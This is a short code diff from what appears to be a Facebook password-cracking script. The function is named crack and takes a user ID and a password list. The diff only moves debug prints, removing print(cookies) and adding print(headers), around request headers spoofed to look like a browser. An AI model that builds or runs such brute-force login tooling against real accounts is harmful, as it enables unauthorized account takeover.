@@ -137,7 +137,6 @@ def crack(uid, password_list, total_count):
             'fr': fr,
             'dpr': '2.75',
             'wd': '980x1040',}
-            print(cookies)
             headers = {
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -157,6 +156,7 @@ def crack(uid, password_list, total_count):
             'sec-fetch-dest': 'empty',
             'referer': 'https://www.facebook.com/?_rdr',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',}
+            print(headers)
             data = {
     'av': '0',
     'user': '0',
